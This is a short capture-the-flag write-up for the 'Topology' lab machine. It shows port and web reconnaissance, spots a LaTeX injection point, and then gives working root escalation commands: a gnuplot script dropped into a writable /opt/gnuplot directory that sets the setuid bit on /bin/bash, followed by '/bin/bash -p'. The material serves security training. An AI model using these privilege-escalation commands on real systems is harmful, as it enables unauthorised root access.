# easy - Topology (machine)

# Table of Content

- [easy - Topology (machine)](#easy---topology-machine)
- [Table of Content](#table-of-content)
- [Content](#content)
    - [User flag](#user-flag)
    - [Root flag](#root-flag)

# Content

## User flag

At simple glance, we've got an ubuntu with apache:
```bash
➤ curl -I topology.htb
HTTP/1.1 200 OK
Date: Thu, 15 Jun 2023 13:18:49 GMT
Server: Apache/2.4.41 (Ubuntu)
Last-Modified: Tue, 17 Jan 2023 17:26:29 GMT
ETag: "1a6f-5f27900124a8b"
Accept-Ranges: bytes
Content-Length: 6767
Vary: Accept-Encoding
Content-Type: text/html
```
And nmap can confirm it:
```bash
➤ sudo nmap -n -Pn -sV -O -T4 topology.htb
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-15 09:19 -04
...
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```
Quick check at source code, I see a latex php file :eyes:!
```bash
➤ curl -s topology.htb  | xurls
https://fonts.googleapis.com/css?family=Roboto
https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css
http://latex.topology.htb/equation.php
https://www.w3schools.com/w3css/default.asp
```
After enabling that latex.topology.htb domain, I've got this:
{{< limg "/i/2023-06-15_09-23.png" "latex generator page">}}

Nice, we've got an Index of files :muscle:!
```bash
➤ curl -s 'http://latex.topology.htb/' | elinks --dump
                                   Index of /
   [1][ICO]        [2]Name        [3]Last modified [4]Size [5]Description
   ══════════════════════════════════════════════════════════════════════
   [6][DIR]  [7]demo/             2023-01-17 12:26       -  
   [8][   ]  [9]equation.php      2023-01-17 12:26    3.8K  
   [10][   ] [11]equationtest.aux 2023-01-17 12:26     662  
   [12][   ] [13]equationtest.log 2023-01-17 12:26     17K  
   [14][   ] [15]equationtest.out 2023-01-17 12:26       0  
   [16][   ] [17]equationtest.pdf 2023-01-17 12:26     28K  
   [18][IMG] [19]equationtest.png 2023-01-17 12:26    2.7K  
   [20][TXT] [21]equationtest.tex 2023-01-17 12:26     112  
   [22][IMG] [23]example.png      2023-01-17 12:26    1.3K  
   [24][TXT] [25]header.tex       2023-01-17 12:26     502  
   [26][DIR] [27]tempfiles/       2023-06-14 11:58       -  
   ══════════════════════════════════════════════════════════════════════
```

Ok sounds like a Latex template injection what we need to exploit here.

## Root flag
```bash
vdaisley@topology:~$ find / -type d -perm /020 -not -perm /040 2>/dev/null
/opt/gnuplot
/var/spool/cron/crontabs
/var/lib/php/sessions
```

Now get a /bin/bash setuid-ed
```bash
echo 'system "chmod u+s /bin/bash"' > /opt/gnuplot/root.plt
/bin/bash -p
```
